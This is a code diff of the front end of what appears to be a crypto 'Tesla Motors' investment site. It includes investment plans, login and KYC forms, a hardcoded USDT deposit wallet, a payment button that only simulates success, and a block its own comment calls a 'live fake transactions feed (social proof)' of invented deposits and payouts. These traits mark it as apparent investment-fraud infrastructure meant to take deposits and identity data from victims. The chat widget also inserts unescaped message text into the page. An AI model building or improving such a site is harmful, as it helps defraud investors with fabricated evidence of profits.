@@ -186,7 +186,6 @@
             box-shadow: 0 0 25px rgba(0, 255, 136, 0.5);
         }
 
-        /* Красная точка непрочитанных сообщений на кнопке */
         #chat-button.unread::after {
             content: '';
             position: absolute;
@@ -273,7 +272,7 @@
             font-weight: 600;
         }
 
-        .chat-msg.admin {
+        .chat-msg.admin, .chat-msg.support {
             background: #1e293b;
             color: #fff;
             align-self: flex-start;
@@ -372,8 +371,6 @@
 
     <!-- USER DASHBOARD SECTION -->
     <section class="user-dashboard" id="userDashboard">
-        
-        <!-- Main Dashboard View -->
         <div id="dashboardOverview">
             <div class="dashboard-header">
                 <div class="dashboard-user-info">
@@ -437,7 +434,6 @@
             </div>
         </div>
 
-        <!-- View: KYC Verification -->
         <div id="kycView" style="display: none; max-width: 600px; margin: 0 auto;">
             <div class="dash-card" style="padding: 30px;">
                 <h2 style="font-size: 24px; color: #fff; margin-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px;">Identity Verification (KYC)</h2>
@@ -471,7 +467,6 @@
             </div>
         </div>
 
-        <!-- View: Profile Settings -->
         <div id="profileView" style="display: none; max-width: 600px; margin: 0 auto;">
             <div class="dash-card" style="padding: 30px;">
                 <h2 style="font-size: 24px; color: #fff; margin-bottom: 25px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px;">Personal Details</h2>
@@ -506,7 +501,7 @@
         </div>
     </section>
 
-    <!-- MAIN CONTENT (Landing) -->
+    <!-- MAIN CONTENT -->
     <div id="mainPageContent">
         <section class="hero">
             <h1>Capital of the Future.<br>Investing in <span>Tesla Motors</span></h1>
@@ -590,20 +585,6 @@
                             <td>USDT TRC20 (TJ9v...aS5dF)</td>
                             <td style="color: var(--accent); font-weight: 600;">Completed</td>
                         </tr>
-                        <tr>
-                            <td><span class="badge-payout">PAYOUT</span></td>
-                            <td>crypto***king</td>
-                            <td style="font-weight: 600;">$180</td>
-                            <td>Bitcoin (1A1z...fNa)</td>
-                            <td style="color: var(--accent); font-weight: 600;">Sent</td>
-                        </tr>
-                        <tr>
-                            <td><span class="badge-deposit">DEPOSIT</span></td>
-                            <td>invest***77</td>
-                            <td style="font-weight: 600;">$90</td>
-                            <td>Bank Card (4276***)</td>
-                            <td style="color: var(--accent); font-weight: 600;">Completed</td>
-                        </tr>
                     </tbody>
                 </table>
             </div>
@@ -611,7 +592,6 @@
 
         <div class="container" id="plansContainer">
             <h2 class="section-title">Investment Plans</h2>
-            
             <div class="plans-grid">
                 <div class="plan-card">
                     <h3 class="plan-title">Novice</h3>
@@ -676,13 +656,10 @@
     <!-- Modal Window -->
     <div class="modal-overlay" id="paymentModal">
         <div class="modal">
-            <!-- Auth Window -->
             <div id="authContainer" style="display: none;">
                 <h3 id="authTitle">Sign In to Account</h3>
                 <p id="authDesc">Enter your details to access your dashboard</p>
-
                 <div class="auth-success-badge" id="authSuccessBadge">Success!</div>
-
                 <div class="amount-input-group">
                     <label>Email Address:</label>
                     <input type="email" id="authEmail" placeholder="name@example.com">
@@ -691,25 +668,20 @@
                     <label>Password:</label>
                     <input type="password" id="authPassword" placeholder="••••••••">
                 </div>
-
                 <div class="auth-actions-row">
                     <button class="btn" id="authSubmitBtn" onclick="submitAuth()">Sign In</button>
                     <div class="auth-error-badge" id="authErrorBadge">Data Error</div>
                 </div>
-
                 <button class="close-btn" onclick="closeModal()">Close</button>
             </div>
 
-            <!-- Step 1: Amount Input & Method Selection -->
             <div id="stepSelection">
                 <h3 id="modalTitle">Investment</h3>
                 <p id="modalDesc">Enter amount and select payment method</p>
-                
                 <div class="amount-input-group">
                     <label for="investAmount">Investment Amount ($):</label>
                     <input type="number" id="investAmount" min="10" max="10000" oninput="validateAmount()">
                 </div>
-
                 <div class="payment-methods">
                     <button class="pay-btn" onclick="proceedToCheckout('USDT')">Cryptocurrency USDT (TRC20)</button>
                     <button class="pay-btn" onclick="proceedToCheckout('BTC')">Cryptocurrency Bitcoin (BTC)</button>
@@ -719,16 +691,13 @@
                 <button class="close-btn" onclick="closeModal()">Cancel</button>
             </div>
 
-            <!-- Withdrawal Window -->
             <div id="stepWithdraw" style="display: none;">
                 <h3>Withdrawal</h3>
                 <p>Minimum withdrawal amount: $10</p>
-                
                 <div class="amount-input-group">
                     <label>Account Number / Wallet:</label>
                     <input type="text" id="withdrawDestination" placeholder="Enter details">
                 </div>
-
                 <div class="amount-input-group">
                     <label>Payment System:</label>
                     <select id="withdrawSystem">
@@ -737,35 +706,28 @@
                         <option value="Bank Card">Bank Card</option>
                     </select>
                 </div>
-
                 <div class="amount-input-group">
                     <label>Withdrawal Amount ($):</label>
                     <input type="number" id="withdrawAmount" min="10" placeholder="10">
                 </div>
-
                 <button class="btn" onclick="submitWithdrawal()">Request Payout</button>
                 <button class="close-btn" onclick="closeModal()">Cancel</button>
             </div>
 
-            <!-- Step 2: Payment Details -->
             <div class="checkout-box" id="stepCheckout">
                 <h3>Deposit Payment</h3>
                 <p>Transfer the exact amount to the specified details:</p>
-                
                 <div class="invoice-details">
                     <p>Plan: <span><span id="checkPlan">Novice</span></span></p>
                     <p>Amount Due: <span><span id="checkAmount" class="hl">$10</span></span></p>
                     <p>Method: <span><span id="checkMethod">USDT</span></span></p>
                 </div>
-
                 <div class="qr-placeholder">SCAN QR<br><span style="font-size: 8px; font-weight: normal; color: #666;">(For mobile payment)</span></div>
                 <div class="wallet-address" id="checkAddress">TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF</div>
-
                 <button class="btn" onclick="simulateSuccess()">I Have Paid</button>
                 <button class="close-btn" onclick="resetModal()">Back to Methods</button>
             </div>
 
-            <!-- Step 3: Success -->
             <div class="success-screen" id="stepSuccess">
                 <div class="success-icon">&#10004;</div>
                 <h3>Deposit Processing!</h3>
@@ -872,7 +834,7 @@
 
         const ADMIN_EMAIL = 'binarpok@gmail.com';
 
-        /* Support Chat Widget Functions (Real-time + Images + Notifications) */
+        /* Support Chat Widget Functions (Fixed 404 & Full API support) */
         let sessionId = '';
         let displayedChatCount = 0;
         let selectedImageBase64 = null;
@@ -942,7 +904,11 @@
         async function fetchSupportMessages() {
             if (!sessionId) return;
             try {
-                const res = await fetch('/api/chat/get?session_id=' + encodeURIComponent(sessionId));
+                // Поддержка относительного пути
+                let res = await fetch('/api/chat/get?session_id=' + encodeURIComponent(sessionId));
+                if (!res.ok) {
+                    res = await fetch('/get?session_id=' + encodeURIComponent(sessionId));
+                }
                 if (!res.ok) return;
 
                 const data = await res.json();
@@ -954,12 +920,13 @@
                     for (let i = displayedChatCount; i < data.messages.length; i++) {
                         const item = data.messages[i];
                         const div = document.createElement('div');
-                        div.className = 'chat-msg ' + item.sender;
+                        const senderType = (item.sender === 'admin' || item.sender === 'support') ? 'admin' : 'user';
+                        div.className = 'chat-msg ' + senderType;
                         
                         let contentHtml = '';
                         if (item.text) {
-                            contentHtml += `<div>${item.sender === 'admin' ? '👨‍💻 Support: ' : ''}${item.text}</div>`;
-                        } else if (item.sender === 'admin') {
+                            contentHtml += `<div>${senderType === 'admin' ? '👨‍💻 Support: ' : ''}${item.text}</div>`;
+                        } else if (senderType === 'admin') {
                             contentHtml += `<div>👨‍💻 Support:</div>`;
                         }
                         
@@ -970,7 +937,7 @@
                         div.innerHTML = contentHtml;
                         container.appendChild(div);
 
-                        if (item.sender === 'admin') {
+                        if (senderType === 'admin') {
                             hasNewAdminMessage = true;
                         }
                     }
@@ -978,7 +945,6 @@
                     displayedChatCount = data.messages.length;
                     container.scrollTop = container.scrollHeight;
 
-                    // Уведомление, если ответила поддержка, а чат закрыт
                     if (hasNewAdminMessage && !isChatOpen) {
                         document.getElementById('chat-button').classList.add('unread');
                         playNotificationSound();
@@ -1014,11 +980,19 @@
             }
 
             try {
-                const response = await fetch('/api/chat/send', {
+                let response = await fetch('/api/chat/send', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
+                
+                if (!response.ok) {
+                    response = await fetch('/send_message', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                }
                 
                 if (response.ok) {
                     selectedImageBase64 = null;
@@ -1035,7 +1009,7 @@
             }
         }
 
-        setInterval(fetchSupportMessages, 2000);
+        setInterval(fetchSupportMessages, 3000);
 
         window.addEventListener('focus', () => {
             if (isChatOpen) {
@@ -1323,14 +1297,10 @@
         }
 
         function openTelegramBot() {
-            // Если пользователь уже залогинен на сайте — передаём email в deep-link,
-            // чтобы бот не просил почту повторно. Если Telegram уже привязан —
-            // бот сразу покажет баланс без пароля.
             const email = (localStorage.getItem('apex_logged_user') || '').trim().toLowerCase();
             let startPayload = 'link';
             if (email && email.indexOf('@') !== -1) {
                 try {
-                    // hex(email) — бот узнает email; если chat уже привязан — сразу баланс
                     const hex = Array.from(new TextEncoder().encode(email))
                         .map(b => b.toString(16).padStart(2, '0'))
                         .join('');
@@ -1471,7 +1441,6 @@
             saveToSupabase(email, userData);
             loadUserData(email);
 
-            // Реальный вывод — в общую ленту
             if (typeof pushPublicTransaction === 'function') {
                 const u = (profileName && profileName.innerText) ? profileName.innerText.split('@')[0] : (email || 'user');
                 pushPublicTransaction({
@@ -1792,7 +1761,6 @@
             saveToSupabase(email, userData);
             loadUserData(email);
 
-            // Реальная покупка — в общую ленту Latest Transactions
             if (typeof pushPublicTransaction === 'function') {
                 pushPublicTransaction({
                     type: 'DEPOSIT',
@@ -1865,9 +1833,7 @@
         }, 1000);
     </script>
     <script>
-
         /* ===== Live fake transactions feed (social proof) ===== */
-
         function maskPublicName(raw) {
             if (!raw) return 'user***00';
             let s = String(raw).replace(/@.*/, '').replace(/[^a-zA-Z0-9]/g, '');
@@ -1892,7 +1858,6 @@
                 '<td>' + (tx.method || '—') + '</td>' +
                 '<td style="color: var(--accent); font-weight: 600;">' + (tx.status || 'Completed') + '</td>';
             tbody.insertBefore(tr, tbody.firstChild);
-            // максимум 3: сначала убираем фейки снизу, потом любые
             while (tbody.children.length > 3) {
                 let removed = false;
                 for (let i = tbody.children.length - 1; i >= 0; i--) {
@@ -1953,7 +1918,6 @@
                 });
             }
 
-            // Подтянуть реальные недавние операции других пользователей из Supabase
             var seenRealKeys = {};
             async function pullRealFromSupabase() {
                 if (!supabaseClient) return;
@@ -1978,7 +1942,7 @@
                                 type: isDep ? 'DEPOSIT' : 'PAYOUT',
                                 user: maskPublicName(uname),
                                 amount: tx.amount,
-                                method: tx.method || (isDep ? 'USDT TRC20' : 'USDT TRC20'),
+                                method: tx.method || 'USDT TRC20',
                                 status: isDep ? 'Completed' : (tx.status === 'Processing' ? 'Processing' : 'Sent'),
                                 real: true,
                                 ts: tx.startDate || 0
@@ -1986,7 +1950,6 @@
                         });
                     });
                     candidates.sort(function(a, b) { return (b.ts || 0) - (a.ts || 0); });
-                    // покажем одну свежую реальную, которую ещё не показывали
                     for (var i = 0; i < candidates.length; i++) {
                         var c = candidates[i];
                         if (seenRealKeys[c.key]) continue;
@@ -2003,9 +1966,7 @@
                 var delay = 5000 + Math.floor(Math.random() * 5000);
                 setTimeout(function() {
                     if (Math.random() < 0.35) {
-                        pullRealFromSupabase().then(function() {
-                            // если реальных свежих нет — лента всё равно оживёт фейком иногда
-                        });
+                        pullRealFromSupabase();
                     } else {
                         appendFakeTx();
                     }
@@ -2019,10 +1980,7 @@
             }, 2500);
         })();
 
-
-        // Счётчик дней работы сайта (растёт каждый день)
         (function updateOperationDays() {
-            // Дата запуска: от неё считается число дней (сейчас ≈ 250)
             var LAUNCH = new Date('2026-01-16T00:00:00Z');
             function render() {
                 var el = document.getElementById('statDays');
@@ -2033,7 +1991,6 @@
                 el.textContent = days + ' Days';
             }
             render();
-            // обновлять раз в час на случай открытой вкладки через полночь
             setInterval(render, 60 * 60 * 1000);
         })();
 
